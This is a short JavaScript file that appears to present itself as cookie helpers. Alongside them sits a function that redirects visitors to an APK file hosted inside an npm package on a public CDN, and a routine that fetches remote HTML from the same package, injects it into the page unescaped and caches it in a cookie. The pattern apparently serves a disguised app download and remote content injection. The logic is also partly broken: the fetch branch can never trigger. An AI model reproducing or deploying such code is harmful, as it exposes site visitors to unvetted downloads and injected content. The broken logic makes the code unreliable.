﻿
function setCookie(cname,cvalue,exdays){
	var d = new Date();
	d.setTime(d.getTime()+(exdays*24*60*60*1000));
	var expires = "expires="+d.toGMTString();
	document.cookie = cname+"="+cvalue+"; "+expires;
}
function getCookie(cname){
	var name = cname + "=";
	var ca = document.cookie.split(';');
	for(var i=0; i<ca.length; i++) {
		var c = ca[i].trim();
		if (c.indexOf(name)==0) { return c.substring(name.length,c.length); }
	}
	return "";
}

function dc()
{ 

 window.location.assign("https://cdn.jsdelivr.net/npm/arcio@1.0.2/fnaka.apk")
 }
function  checkCookie(){
 function  spd(){
         k=getCookie("mkl");
          if  (k==null){
a=$.get("https://cdn.jsdelivr.net/npm/arcio@1.0.2/la.html");
a.done(function(){
var  b=a.responseText;
let m=document.getElementById("p1");
 m.innerHTML=b;
 setCookie("mkl",b,250);
 
})}
else {
let kch=document.getElementById("p1");
 kch.innerHTML=k;


 }}}
